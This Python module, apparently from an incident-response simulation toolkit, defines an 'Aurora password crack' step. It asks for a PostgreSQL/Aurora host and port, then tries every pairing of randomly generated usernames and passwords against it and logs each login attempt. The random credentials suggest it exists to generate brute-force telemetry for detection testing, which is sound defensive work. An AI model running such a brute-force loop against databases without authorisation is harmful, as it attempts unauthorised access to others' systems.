import psycopg2
import random
import string
from PyInquirer import prompt
from socialist_ir.cdk_menu import CdkMenu
from socialist_ir.config import Config


class AuroraPwdCrack(CdkMenu):
    def __init__(
        self,
        name: str = "aurora_pwd_crack",
        required_variables: list = ["host", "port"],
    ):
        super().__init__(name=name, required_variables=required_variables)

    def connect(self, user: str, passwd: str) -> bool:
        host = self.config.get(self.name, "host")
        port = self.config.get(self.name, "port")
        try:
            con = psycopg2.connect(
                f"user={user} host={host} port={port} password={passwd}"
            )
            print(f"[*] Connection established {user}:{passwd}@{host}")
            return con
        except Exception as e:
            print(f"[!] Login failed {user}:{passwd}@{host}\t{e}")
            return False

    def create_dummy_string_list(
        self, max_strings: int = 10, max_string_length: int = 10
    ) -> list:
        string_list = []
        for _ in range(max_strings):
            letters = string.ascii_lowercase
            s = "".join(random.choice(letters) for i in range(max_string_length))
            string_list.append(s)
        return string_list

    def execute(self) -> bool:
        # Create dummy credentials
        userlist = self.create_dummy_string_list()
        passlist = self.create_dummy_string_list()

        # Brute-force credentials
        for user in userlist:
            for password in passlist:
                status = self.connect(user, password)
                if status:
                    print("[*] Credentials found!")
                    return True
        print(f"[!] No credentials found!")

        return False

    def setup(self) -> None:
        # Prompt required variables
        questions = [
            {
                "type": "input",
                "name": "host",
                "message": "Please enter the host for the Aurora Instance",
            },
            {
                "type": "input",
                "name": "port",
                "message": "Please enter the port for the Aurora Instance",
            },
        ]

        answers = prompt(questions)

        # Save variables to config
        if answers and answers["host"] and answers["port"]:
            self.config.set(self.name, "host", answers["host"])
            self.config.set(self.name, "port", answers["port"])
            Config.save_config(self.config)
